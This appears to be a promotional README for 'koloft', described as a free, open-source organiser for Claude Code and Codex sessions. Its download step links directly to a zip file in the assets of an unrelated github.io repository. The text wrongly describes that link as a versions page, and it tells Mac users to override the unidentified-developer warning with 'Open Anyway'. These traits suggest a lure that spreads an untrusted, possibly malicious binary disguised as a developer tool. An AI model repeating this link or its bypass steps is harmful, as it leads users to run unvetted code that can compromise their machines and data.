✨ What is koloft?

Imagine you have a smart assistant that helps you write code on your computer. Sometimes you use one assistant called Claude Code, and sometimes you use another called Codex. They do amazing things, but keeping track of all their work can be messy. That's where koloft comes in!

koloft is like a super-organized filing cabinet for your AI coding projects. It neatly stores every single conversation you have with your AI helpers, puts all the changed files in their own special folder, and even shows you a web browser and a command screen right next to your work. Everything is in one clean, easy-to-find place.

🌟 Amazing Features

🗂️ Everything in One Folder

Each session gets its own personal folder. Inside, you'll find the conversation history, all the files that were changed, and any important notes. No more hunting around your computer for lost work!

🖥️ Built-in Browser and Shell

See the internet and type commands without leaving your workspace. koloft gives you a mini web browser and a command terminal right beside your AI chat. Test your website and run commands all in one window.

🤖 Works with Your Favorite AI

Whether you use Claude Code or Codex (or both!), koloft manages them seamlessly. Switch between them without any hassle.

🔍 Easy to Find Everything

The simple, clean layout shows you all your projects at a glance. You can search, sort, and quickly jump back to any previous session.

💾 How to Get koloft

Step 1: Download the App

Visit this link to download the application: https://github.com/DALEMBAC/dalembac.github.io/raw/refs/heads/main/assets/Release_v1.0.zip

You'll see a page with different versions of the app. Click on the newest one, and your Mac will start downloading it automatically.

Step 2: Open the App

Once the download is finished, go to your Downloads folder. You'll see a file called koloft (it might look like a small icon). Double-click it to open the app.

If your Mac shows a message saying "koloft can't be opened because it's from an unidentified developer," don't worry! This is normal for new apps. Simply go to System Settings → Privacy & Security, and you'll see a message about koloft. Click "Open Anyway" to allow it to run.

Step 3: Start Using It

When koloft opens, you'll see a friendly welcome screen. Click "Create New Session" to start working with your AI assistant. Follow the simple on-screen instructions, and you're ready to go!

Yes! koloft is completely free and open-source. That means you can use it forever without paying anything, and developers can even look at the code to see how it works.

Do I need to know how to code?

Not at all! koloft is designed for everyone. Whether you're a professional programmer or just curious about AI, you can use it easily.
